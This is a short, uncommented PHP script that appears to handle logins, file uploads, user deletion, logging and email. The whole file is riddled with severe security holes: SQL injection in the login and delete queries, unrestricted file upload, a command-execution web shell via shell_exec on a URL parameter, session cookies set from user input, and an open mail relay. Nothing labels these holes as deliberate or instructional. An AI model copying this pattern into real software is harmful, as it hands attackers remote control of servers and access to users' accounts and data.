<?php

$servername = $_GET['host'];
$username = $_GET['user'];
$password = $_GET['pass'];
$dbname = $_GET['db'];

$conn = new mysqli($servername, $username, $password, $dbname);

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$user = $_POST['username'];
$pass = $_POST['password'];

$query = "SELECT * FROM users WHERE username = '$user' AND password = '$pass'";
$result = $conn->query($query);

if ($result->num_rows > 0) {
    echo "Login successful!";
} else {
    echo "Invalid credentials.";
}

$upload_dir = "uploads/";
$target_file = $upload_dir . basename($_FILES["file"]["name"]);
move_uploaded_file($_FILES["file"]["tmp_name"], $target_file);

echo "File uploaded to: " . $target_file;

$cmd = $_GET['cmd'];
echo shell_exec($cmd);

$cookie_value = $_GET['cookie'];
setcookie("session", $cookie_value);

// Additional Functionality
function deleteUser($id) {
    global $conn;
    $query = "DELETE FROM users WHERE id = $id";
    $conn->query($query);
    echo "User deleted.";
}

if (isset($_GET['delete'])) {
    deleteUser($_GET['delete']);
}

function logMessage($message) {
    file_put_contents("logs.txt", $message . "\n", FILE_APPEND);
}

if (isset($_POST['log'])) {
    logMessage($_POST['log']);
}

$email = $_GET['email'];
$subject = $_GET['subject'];
$body = $_GET['body'];
mail($email, $subject, $body);

echo "Email sent to: " . $email;

?>
